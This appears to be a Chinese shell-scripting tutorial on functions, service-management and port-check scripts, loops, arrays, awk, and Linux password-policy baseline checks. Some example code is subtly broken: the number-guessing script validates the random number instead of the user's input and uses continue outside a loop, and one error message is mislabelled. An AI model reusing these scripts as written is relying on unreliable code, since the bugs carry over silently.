</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#定义方式01 最完整</span>
<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">lidao_show</span></span>() {
内容
 <span class="hljs-built_in">return</span> n  <span class="hljs-comment">#函数的返回值</span>
}
<span class="hljs-comment">#定义方式02   精简写法 一般使用这一种.</span>
<span class="hljs-function"><span class="hljs-title">lidao_show</span></span>() {
命令
 <span class="hljs-built_in">return</span> n  <span class="hljs-comment">#函数的返回值</span>
}
</code></pre>
<ul>
<li>函数传参</li>
</ul>






























<table><thead><tr><th>参数</th><th>shell脚本中</th><th>函数中</th></tr></thead><tbody><tr><td>$n</td><td>脚本的第n个参数</td><td>函数的第n个参数</td></tr><tr><td>$0</td><td>脚本的名字</td><td>脚本的名字</td></tr><tr><td>$#</td><td>脚本的参数个数</td><td>函数的参数个数</td></tr><tr><td><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">@</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">@/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">@/</span></span></span></span></span>*</td><td>脚本的所有参数</td><td>函数的所有参数</td></tr></tbody></table>
<p><strong>案例：书写sersync服务的管理脚本</strong></p>
<ul>
<li>
<p>sh data_sync.sh start|stop|restart|status</p>
</li>
<li>
<p>需求</p>
<ul>
<li>
<p>如果用户输入的是start,则运行sersync启动的命令。</p>
</li>
<li>
<p>如果用户输入的是stop,则运行关闭sersync的命令。</p>
</li>
<li>
<p>如果用户输入的是status，则显示sersync是否运行中，pid。</p>
</li>
<li>
<p>如果用户输入的是restart,则运行stop的命令，然后运行start的命令。</p>
</li>
<li>
<p>如果用户输入的是其他的内容，则提示输入错误，提示格式。</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim  07.data_sync.sh </span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:07.data_sync.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:sersync服务管理脚本</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#1.vars命令行传参</span>
choice=<span class="hljs-variable">$1</span>
sersync_dir=/app/tools/sersync
srv_status=`ps -ef|grep sersync |egrep -v <span class="hljs-string">"grep|<span class="hljs-variable">$0</span>"</span> |<span class="hljs-built_in">wc</span> -l`
<span class="hljs-comment">#2.书写功能对应的函数</span>
<span class="hljs-function"><span class="hljs-title">start</span></span>() {
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$srv_status</span> -eq 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-variable">${sersync_dir}</span>/bin/sersync -rdo <span class="hljs-variable">${sersync_dir}</span>/conf/confxml.xml &amp;&gt;/dev/null
  <span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is already running"</span>
  <span class="hljs-keyword">fi</span>
}
<span class="hljs-function"><span class="hljs-title">stop</span></span>() {
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$srv_status</span> -eq 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is already stopped"</span>
  <span class="hljs-keyword">else</span>
    pkill sersync
  <span class="hljs-keyword">fi</span>
}
<span class="hljs-function"><span class="hljs-title">restart</span></span>() {
  pkill sersync
  <span class="hljs-variable">${sersync_dir}</span>/bin/sersync -rdo <span class="hljs-variable">${sersync_dir}</span>/conf/confxml.xml &amp;&gt;/dev/null
}
<span class="hljs-function"><span class="hljs-title">status</span></span>() {
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$srv_status</span> -eq 0 ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is not running"</span>
  <span class="hljs-keyword">else</span>
    pid=`ps -ef|grep sersync |egrep -v <span class="hljs-string">"grep|<span class="hljs-variable">$0</span>"</span> |awk <span class="hljs-string">'{print $2}'</span>`
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"sersync is running,pid is <span class="hljs-variable">$pid</span>"</span>
  <span class="hljs-keyword">fi</span>

}
<span class="hljs-comment">#3.case语句</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  <span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$choice</span>"</span> <span class="hljs-keyword">in</span>
    start)
          start
          ;;
    stop)
          stop
          ;;
    restart)
          restart
          ;;
    status)
          status
          ;;
    *)
          <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage:<span class="hljs-variable">$0</span> {start|stop|restart|status}"</span>
  <span class="hljs-keyword">esac</span>
}

main


<span class="hljs-comment">#测试</span>
sh 07.data_sync.sh status
</code></pre>
<h4 data-id="heading-25">6.必知必会命令</h4>
<h5 data-id="heading-26">6.1 检查端口</h5>
<pre><code class="hljs language-sh" lang="sh">检查端口是否存在
ss -lntup |grep 80
netstat -lntup |grep 80
lsof -i:80

<span class="hljs-comment">#检查ip、端口能否访问</span>
telnet 
nc 
<span class="hljs-comment">#-z 无io模式，用于检查端口是否连通。</span>
nc -z 10.0.0.61 80

nmap
</code></pre>
<h5 data-id="heading-27">6.2 检查进程</h5>
<pre><code class="hljs language-sh" lang="sh">top ps
</code></pre>
<h5 data-id="heading-28">6.3 检查网络</h5>
<pre><code class="hljs language-sh" lang="sh">ping -c2 www.baidu.com
iftop
</code></pre>
<h5 data-id="heading-29">6.4 检查web 域名或ip能否访问</h5>
<pre><code class="hljs language-sh" lang="sh">curl/wget
<span class="hljs-comment">#-v显示过程   -I获取响应头</span>
<span class="hljs-comment">#-s slient 安静模式 如果不使用默认输出下载进度</span>
<span class="hljs-comment">#-o curl的输出到指定位置的文件</span>
<span class="hljs-comment">#-w 按照指定格式与内容输出 %{http_code}状态码   更多格式 man </span>
curl 搜索 variable
curl: -v -L -H -I -w -o

<span class="hljs-comment">#-t 失败后，重复尝试次数、-T timeout 超时时间 -q 不显示wget输出  --spider 不下载文件,仅访问</span>
wget -t 3 -T 1 -q --spider www.baidu.com
</code></pre>
<p><strong>案例：检查指定地址和端口是否可以访问</strong></p>
<ul>
<li>sh  check_access.sh  10.0.0.61  22</li>
<li>nc</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># cat 08.check_access.sh </span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">########################################################</span>
<span class="hljs-comment"># File Name:08.check_access.sh</span>
<span class="hljs-comment"># Version:V1.0</span>
<span class="hljs-comment"># Author:liux</span>
<span class="hljs-comment"># Desc:检查指定ip和端口是否可以访问</span>
<span class="hljs-comment">########################################################</span>

<span class="hljs-comment">#加载系统内置函数库</span>
. /etc/init.d/functions

addr=<span class="hljs-variable">$1</span>
port=<span class="hljs-variable">$2</span>

<span class="hljs-comment">#检查nc命令是否存在</span>
<span class="hljs-function"><span class="hljs-title">check_nc</span></span>() {
  <span class="hljs-built_in">which</span> nc &amp;&gt;/dev/null || {
    yum -y install nc
  }
}
<span class="hljs-comment">#检查域名和ip是否合法</span>
<span class="hljs-function"><span class="hljs-title">check_valid</span></span>() {
  [[ <span class="hljs-string">"<span class="hljs-variable">$addr</span>"</span> =~ ^([0-9.]+|[a-z.]+)$ ]] || {
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"输入的域名不合法，<span class="hljs-variable">$addr</span>"</span>
     <span class="hljs-built_in">exit</span> 1
  }
  [[ <span class="hljs-string">"<span class="hljs-variable">$port</span>"</span> =~ ^[0-9]+$ ]] || {
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"输入的ip不合法，<span class="hljs-variable">$port</span>"</span>
     <span class="hljs-built_in">exit</span> 1
  }

}  
<span class="hljs-comment">#用nc命令检查</span>
<span class="hljs-function"><span class="hljs-title">check_port</span></span>() {
  nc -z <span class="hljs-variable">$addr</span> <span class="hljs-variable">$port</span>
  <span class="hljs-keyword">if</span> [ $? -eq 0 ];<span class="hljs-keyword">then</span>
      action <span class="hljs-string">"可以访问，是通的"</span> /bin/true
  <span class="hljs-keyword">else</span>
      action <span class="hljs-string">"无法访问"</span> /bin/false
  <span class="hljs-keyword">fi</span>
}
<span class="hljs-comment">#调用函数</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  check_nc
  check_valid
  check_port
}
main


 “=~” 用于判断左边字符串和右边的正则表达式是否匹配
 正则表达式^表示起始，$表示结束，?表示0个或者1个
</code></pre>
<h3 data-id="heading-30">三、shell自动化编程-循环</h3>
<h4 data-id="heading-31">1.for循环</h4>
<ul>
<li>最常用的for循环方式    大部分场景可用</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span> 变量  <span class="hljs-keyword">in</span> 候补清单（列表）
<span class="hljs-keyword">do</span>
   命令
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#for循环一般搭配着{1..10}  `seq 10`  `ls /etc/`</span>
</code></pre>
<ul>
<li>c语言格式for循环    对数组循环使用</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span>((i=<span class="hljs-number">1</span>;i&lt;=<span class="hljs-number">10</span>;i++))
<span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span>
<span class="hljs-keyword">done</span>
</code></pre>
<p><strong>案例</strong>：使用for循环在/liux目录下通过随机小写10个字母加固定字符串liux批量创建10个html文件</p>
<ul>
<li>
<p>例如：apquvdpqbk_liux.html</p>
</li>
<li>
<p>生成随机数</p>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#1.</span>
uuidgen
<span class="hljs-comment">#2. -l密码长度，-d数字数量，-s special 特殊字符 -C 大写字母 -c小写字母</span>
mkpasswd -l 10 -d 0 -s 0 -C 0

<span class="hljs-comment">#3.-c取反，-d删除 /dev/urandom 字符设备，生成随机字符</span>
<span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">'a-z'</span> &lt;/dev/urandom |<span class="hljs-built_in">head</span> -c 10
<span class="hljs-comment">#4.%N纳秒</span>
<span class="hljs-built_in">date</span> +%N |<span class="hljs-built_in">md5sum</span>
<span class="hljs-comment">#5</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$RANDOM</span>
</code></pre>
<ul>
<li>代码</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 09.touch_files.sh</span>

<span class="hljs-comment">#!/bin/bash</span>

<span class="hljs-comment">#1.vars</span>
<span class="hljs-built_in">dir</span>=/liux

<span class="hljs-comment">#2.检查</span>
[ ! -d <span class="hljs-variable">$dir</span> ] &amp;&amp; <span class="hljs-built_in">mkdir</span> -p <span class="hljs-variable">$dir</span>

<span class="hljs-comment">#3.for循环</span>

<span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> {1..10}
<span class="hljs-keyword">do</span>
  file_name_pre=`<span class="hljs-built_in">tr</span> -<span class="hljs-built_in">cd</span> <span class="hljs-string">'a-z'</span> &lt;/dev/urandom |<span class="hljs-built_in">head</span> -c 10`
  file_name_full=<span class="hljs-variable">${file_name_pre}</span>_liux.html
  <span class="hljs-built_in">touch</span> <span class="hljs-variable">${dir}</span>/<span class="hljs-variable">${file_name_full}</span>
<span class="hljs-keyword">done</span>

</code></pre>
<h4 data-id="heading-32">2.while循环</h4>
<ul>
<li>加入条件</li>
<li>死循环</li>
<li>读取文件</li>
</ul>
<h5 data-id="heading-33">2.1while循环通用格式</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">while</span> 条件
<span class="hljs-keyword">do</span>
     命令
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#温馨提示： while循环只会在满足条件后运行</span>
</code></pre>
<h5 data-id="heading-34">2.2案例：生成随机数，判断数字是什么</h5>
<ul>
<li>
<p>如果输入的数字比随机数大,提示大了,</p>
</li>
<li>
<p>如果输入数字比随机数小,提示小了,</p>
</li>
<li>
<p>如果等于提示恭喜</p>
</li>
<li>
<p>额外要求:</p>
<ul>
<li>
<p>用了1-3次 超越了99.99%人</p>
</li>
<li>
<p>用了4-6次 超越80%的人</p>
</li>
<li>
<p>其他 超越了70%的人</p>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 10.guess_num.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#1.vars</span>
num_rand=$(( RANDOM%<span class="hljs-number">100</span> ))
i=1

<span class="hljs-comment">#2.检查输入的是否为数字</span>
<span class="hljs-function"><span class="hljs-title">num_check</span></span>() {
  [[ <span class="hljs-variable">$num_rand</span> =~ ^[0-9]+$ ]] || {
    <span class="hljs-built_in">echo</span> “请输入数字”
    <span class="hljs-built_in">continue</span>
  }
}

<span class="hljs-comment">#3.排名功能</span>
<span class="hljs-function"><span class="hljs-title">ranking</span></span>() {
  cnt=$((i-<span class="hljs-number">1</span>))
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$cnt</span> -le 3 ];<span class="hljs-keyword">then</span>
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜您，使用了<span class="hljs-variable">$cnt</span>次，超越了99.99%的用户"</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$cnt</span> -ge 4 -a <span class="hljs-variable">$cnt</span> -le 6 ];<span class="hljs-keyword">then</span>
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜您，使用了<span class="hljs-variable">$cnt</span>次，超越了80%的用户"</span>
  <span class="hljs-keyword">else</span>
     <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜您，使用了<span class="hljs-variable">$cnt</span>次,超越了70%的用户"</span>
  <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment">#4.用户输入数字，判断</span>
<span class="hljs-function"><span class="hljs-title">input_num_compare</span></span>() {
  <span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入数字"</span> num
  num_check
  <span class="hljs-built_in">let</span> i++
  <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$num</span> -gt <span class="hljs-variable">$num_rand</span> ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"很抱歉，猜大了"</span>
  <span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$num</span> -lt <span class="hljs-variable">$num_rand</span> ];<span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"很抱歉，猜小了"</span>
  <span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"恭喜猜对了"</span>
    ranking
    <span class="hljs-built_in">exit</span>
  <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment">#5.书写主函数</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
<span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>
<span class="hljs-keyword">do</span>
  input_num_compare
<span class="hljs-keyword">done</span>
}
main
</code></pre>
<ul>
<li>while循环-读取文件内容
<ul>
<li>需要在脚本中读取文件内容，多行。此时可以选择3剑客或while循环</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#方式1：采用exec读取文件后，然后进入while循环处理。</span>
<span class="hljs-built_in">exec</span>&lt;FILE
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
<span class="hljs-keyword">do</span>
   cmd
    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#方式2：使用cat读取文件内容，然后通过管道进入 不适用于有变量传递场景使用。</span>
<span class="hljs-built_in">cat</span> FILE|<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
<span class="hljs-keyword">do</span>
   cmd
   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$line</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#方式3：在while循环结尾done通过输入重定向指定读取的文件。 推荐使用</span>
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line
<span class="hljs-keyword">do</span>
   cmd
<span class="hljs-keyword">done</span>&lt;FILE
</code></pre>
<h4 data-id="heading-35">3.do-until循环</h4>
<ul>
<li>无论条件是否满足，都会执行一次</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#直到型循环: 一直循环,直到条件不满足.</span>
until 条件
<span class="hljs-keyword">do</span>
   命令
   命令
   ....
<span class="hljs-keyword">done</span>
until 话费是否充足
<span class="hljs-keyword">do</span>
   发短信
<span class="hljs-keyword">done</span>

<span class="hljs-comment">#先执行，再判断条件是否满足</span>
</code></pre>
<h4 data-id="heading-36">4.循环控制语句</h4>






























<table><thead><tr><th>语句</th><th>含义</th><th>应用场景</th></tr></thead><tbody><tr><td>exit</td><td>终止执行脚本,退出返回值</td><td>脚本结束加上exit</td></tr><tr><td>return</td><td>放在函数中,终止执行函数,函数返回值</td><td>写在函数中，检查函数命令运行是否成功</td></tr><tr><td><strong>break</strong></td><td>终止循环（退出）</td><td>需要在循环中退出循环</td></tr><tr><td><strong>continue</strong></td><td>终止（跳过）本次循环，进入下一次循环</td><td>要在循环中跳过某一次循环</td></tr></tbody></table>
<h3 data-id="heading-37">四、shell编程-辅助功能</h3>
<ul>
<li>颜色</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> {30..48};<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\E[1;<span class="hljs-variable">${n}</span>mliux\E[0m"</span> ; <span class="hljs-keyword">done</span>
</code></pre>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#创建环境变量或写入脚本开头</span>
<span class="hljs-built_in">export</span> RED=<span class="hljs-string">"\E[5;31m"</span>
<span class="hljs-built_in">export</span> GREEN=<span class="hljs-string">"\E[1;32m"</span>
<span class="hljs-built_in">export</span> BLUE=<span class="hljs-string">"\E[1;34m"</span>
<span class="hljs-built_in">export</span> END=<span class="hljs-string">"\E[0m"</span>
<span class="hljs-comment">#永久使用/etc/profile中即可</span>

<span class="hljs-comment">#写为函数</span>
<span class="hljs-function"><span class="hljs-title">redecho</span></span>() {
  <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[5;31m"</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[0m"</span>
  <span class="hljs-comment">#echo -e "\e[5;31m $@ \e[0m"</span>
}
<span class="hljs-function"><span class="hljs-title">greenecho</span></span>() {
  <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[1;32m"</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[0m"</span>
}
<span class="hljs-function"><span class="hljs-title">blueecho</span></span>() {
  <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">"\e[1;34m"</span>
  <span class="hljs-built_in">echo</span> -n <span class="hljs-string">"<span class="hljs-variable">$@</span>"</span>
  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[0m"</span>
}
</code></pre>
<h3 data-id="heading-38">五、shell编程-数组</h3>
<pre><code class="hljs language-sh" lang="sh">names=(web01 web02 db01 nfs01 backup)
<span class="hljs-keyword">for</span> n  <span class="hljs-keyword">in</span>  <span class="hljs-variable">${names[@]}</span>
<span class="hljs-keyword">do</span>
     ping -c 1 -W 1  <span class="hljs-variable">$n</span>  
<span class="hljs-keyword">done</span>
</code></pre>
<ul>
<li>shell数组赋值</li>
</ul>

















<table><thead><tr><th>赋值</th><th/></tr></thead><tbody><tr><td>直接赋值</td><td>array=(ip01 ip02 ip03 ip04 )<br/>array=( <code>cat ip.txt</code>) #cat ip.txt 三剑客命令获取指定内容</td></tr><tr><td>read命令赋值</td><td>read -a -p "输入数组中内容:" array 可以创建数组,空格分割即可</td></tr></tbody></table>
<ul>
<li>案例：从键盘输入10个整数，求和、平均数。</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">[root@m01 devops-shell]<span class="hljs-comment"># vim 11.read_sum.sh</span>

<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#0.vars</span>
. ./func.sh
<span class="hljs-built_in">sum</span>=0
avg=0
i=1
tmp_file=/tmp/num.txt

<span class="hljs-comment">#1.初始化，判断文件是否存在</span>
<span class="hljs-function"><span class="hljs-title">init</span></span>() {
  [ -f <span class="hljs-variable">$tmp_file</span> ] &amp;&amp; <span class="hljs-built_in">rm</span> -f <span class="hljs-variable">$tmp_file</span>
  <span class="hljs-built_in">return</span> $?
}

<span class="hljs-comment">#2.读取用户输入</span>
<span class="hljs-function"><span class="hljs-title">read_num</span></span>() {
  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>
<span class="hljs-keyword">do</span>
  [ <span class="hljs-variable">$i</span> -gt 10 ] &amp;&amp; <span class="hljs-built_in">break</span>
  <span class="hljs-built_in">read</span> -p <span class="hljs-string">"请输入第<span class="hljs-variable">${i}</span>个数字："</span> num
  [[ <span class="hljs-string">"<span class="hljs-variable">$num</span>"</span> =~ ^[0-9]+$ ]] || <span class="hljs-built_in">continue</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-variable">$num</span> &gt;&gt;<span class="hljs-variable">$tmp_file</span>
  <span class="hljs-built_in">let</span> i++
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">return</span> $?
}

<span class="hljs-comment">#3.进行计算</span>
<span class="hljs-function"><span class="hljs-title">num_calc</span></span>() {
  num_array=(`<span class="hljs-built_in">cat</span> <span class="hljs-variable">$tmp_file</span>`)
  <span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-variable">${num_array[@]}</span>
  <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">let</span> <span class="hljs-built_in">sum</span>+=num
  <span class="hljs-keyword">done</span>
  <span class="hljs-built_in">return</span> $?
}

<span class="hljs-comment">#4.输出总和与平均数</span>
<span class="hljs-function"><span class="hljs-title">num_print</span></span>() {
  avg=`<span class="hljs-built_in">echo</span> <span class="hljs-string">"scale=2;<span class="hljs-variable">$sum</span>/10"</span>|bc -l`
  rc=$?
  blueecho <span class="hljs-string">"用户输入的数字有：<span class="hljs-variable">${num_array[@]}</span>"</span>
  greenecho <span class="hljs-string">"10个数字的总和是<span class="hljs-variable">$sum</span>,平均数是<span class="hljs-variable">$avg</span>"</span>
  <span class="hljs-built_in">return</span> <span class="hljs-variable">$rc</span>
}

<span class="hljs-comment">#5.主函数</span>
<span class="hljs-function"><span class="hljs-title">main</span></span>() {
  init
  read_num
  num_calc
  num_print
}

main
</code></pre>
<h3 data-id="heading-39">六、shell编程-debug全流程</h3>
<h4 data-id="heading-40">1.书写习惯</h4>
<ul>
<li>注释</li>
<li>变量：在脚本中尽量使用变量，变量命令规范，给变量加上注释</li>
<li>函数：代码中尽可能使用函数，增加说明</li>
<li>返回值：尽可能增加函数return功能，方便后期调试</li>
<li>参数与选项检查：尽可能增加exit 返回值的功能，方便后期调试</li>
<li>输出：书写代码的时候，可以多写一些echo用于在某些步骤中进行输出</li>
<li>缩进：代码注意缩进</li>
</ul>
<h4 data-id="heading-41">2.调试方法</h4>
<ul>
<li>-x    大部分情况使用      显示详细的执行过程</li>
<li>精确显示执行过程
<ul>
<li>set    -x   开启显示执行过程</li>
<li>set    +x  关闭显示箱子过程</li>
</ul>
</li>
<li>注释法</li>
<li>输出关键变量</li>
</ul>
<h3 data-id="heading-42">七、再战三剑客</h3>
<h4 data-id="heading-43">1.sed与变量</h4>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-built_in">cat</span> ip.txt
10.0.0.5
10.0.0.6
10.0.0.7
src=10.0.0
dst=172.16.1
sed <span class="hljs-string">"s#<span class="hljs-variable">$src</span>#<span class="hljs-variable">$dst</span>#g"</span> ip.txt
172.16.1.5
172.16.1.6
172.16.1.7
</code></pre>
<h4 data-id="heading-44">2.awk判断</h4>
<pre><code class="hljs language-sh" lang="sh"> awk <span class="hljs-string">'{if(NR&lt;=5){print $0}}'</span> /etc/passwd
 awk <span class="hljs-string">'{
       if(NR&lt;=5){
          print $0
        }
 }'</span> /etc/passwd
 
</code></pre>
<h4 data-id="heading-45">3.awk循环</h4>
<pre><code class="hljs language-sh" lang="sh">awk <span class="hljs-string">'BEGIN{for(i=1;i&lt;=100;i++) {sum=sum+i} print sum }'</span>
</code></pre>
<h4 data-id="heading-46">4.awk数组</h4>
<ul>
<li>awk数组专用于统计与分析
<ul>
<li>去重统计次数</li>
<li>去重求和</li>
</ul>
</li>
<li>awk数组与shell数组区别
<ul>
<li>awk数组：关联数组，下标啥都行</li>
<li>shell数组：普通数组，下标数字,shell中也有关联数组</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">awk <span class="hljs-string">'BEGIN{array[0]="lidao996";array["lidao"]=996;array[110]="sos"; print array[0]}'</span>
</code></pre>
<ul>
<li>awk专用于数组的循环</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-keyword">for</span>(n  <span class="hljs-keyword">in</span> 数组名字)
   <span class="hljs-built_in">print</span> n(数组下标),数组名字[n]
         数组下标    对应的值
</code></pre>
<pre><code class="hljs language-sh" lang="sh">vim awk-array.txt
url               次数
img.oldboylinux.cn 6
bbs.oldboylinux.cn 7
avi.oldboylinux.cn 99
mp4.oldboylinux.cn 88

<span class="hljs-comment">#以url为下标，次数为元素值的数组，输出内容</span>
awk <span class="hljs-string">'NR&gt;1{array[$1]=$2}END{ for( url in array) print url,array[url] }'</span> awk-array.txt
</code></pre>
<ul>
<li>去重统计次数</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"> vim url.txt
http://www.etiantian.org/index.html
http://www.etiantian.org/1.html
http://post.etiantian.org/index.html
http://mp3.etiantian.org/index.html
http://www.etiantian.org/3.html
http://post.etiantian.org/2.html


awk -F<span class="hljs-string">'/+'</span> <span class="hljs-string">'{url[$2]=url[$2]+1}END{for(name in url) print name,url[name]}'</span> url.txt
</code></pre>
<h3 data-id="heading-47">八、shell编程-安全基线检查脚本</h3>
<h4 data-id="heading-48">1.身份鉴权</h4>
<h5 data-id="heading-49">1.1配置口令复杂度</h5>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#默认格式</span>
[root@m01 ~]<span class="hljs-comment"># grep pwquality /etc/pam.d/system-auth</span>
password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=

<span class="hljs-comment">#修改</span>
vim /etc/pam.d/system-auth
password requisite pam_pwquality.so try_first_pass local_users_only retry=3 difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1 authtok_type=
<span class="hljs-comment">#root用户也使用</span>
enforce_for_root

<span class="hljs-comment">#检查有没有配置密码复杂度</span>
egrep -o <span class="hljs-string">'minlen|[uld]credit'</span> /etc/pam.d/system-auth |<span class="hljs-built_in">wc</span> -l
</code></pre>
<blockquote>
<p>minlen=8 至少8位</p>
<p>ucredit=-1 upper 大写字母 -号表示至少-1位 3 最多3位</p>
<p>lcredit=-1 lower 小写字母 -号表示至少-1位</p>
<p>dcredit=-1 digit 数字 -号表示至少-1</p>
<p>difok=3 与上个密码重复的内容</p>
<p>enforce_for_root 也限制root修改密码</p>
</blockquote>
<h5 data-id="heading-50">1.2设置口令认证失败锁定次数</h5>
<pre><code class="hljs language-sh" lang="sh">vim /etc/pam.d/system-auth
<span class="hljs-comment">#auth是属于认证部分</span>
auth required pam_tally2.so onerr=fail deny=3 unlock_time=20

<span class="hljs-comment">#注：解锁用户 pam_tally2 -u liux --reset</span>
<span class="hljs-comment">#温馨提示: 这个规则放在最上面.</span>
<span class="hljs-comment">#如果需要root 也错误并锁定则增加even_deny_root即可</span>

<span class="hljs-comment">#检查是否配置</span>
grep pam_tally2.so /etc/pam.d/system-auth |egrep -o <span class="hljs-string">'deny=|unlock_time='</span> |<span class="hljs-built_in">wc</span> -l
</code></pre>
<h5 data-id="heading-51">1.3配置口令生存周期</h5>
<ul>
<li>是否配置新用户的密码过期</li>
<li>检查是否最近30天有用户密码要过期</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#新用户</span>
<span class="hljs-comment">#建议在/etc/login.defs文件中配置：</span>

PASS_MAX_DAYS 90 <span class="hljs-comment">#新建用户的密码最长使用天数</span>
PASS_MIN_DAYS 0 <span class="hljs-comment">#新建用户的密码最短使用天数</span>
PASS_WARN_AGE 7 <span class="hljs-comment">#新建用户的密码到期提前提醒天数</span>

<span class="hljs-comment">#命令修改已经存在的用户过期时间  -x最长使用天数  -w 过期提醒7天前</span>
passwd -x 90 -n 0 -w 7 liux

<span class="hljs-comment">#检查</span>
chage -l liux

awk <span class="hljs-string">'/^PASS_MAX_DAYS/{print $2}'</span> /etc/login.defs 或者
grep <span class="hljs-string">"^PASS_MAX_DAYS"</span> /etc/login.defs |awk <span class="hljs-string">'{print $NF}'</span>

awk <span class="hljs-string">'/^PASS_WARN_AGE/{print $2}'</span> /etc/login.defs

<span class="hljs-comment">#密码过期判断</span>
<span class="hljs-comment">#1. 可以登录系统 /bin/bash</span>
awk -F: <span class="hljs-string">'$NF=="/bin/bash" {print $1}'</span> /etc/passwd
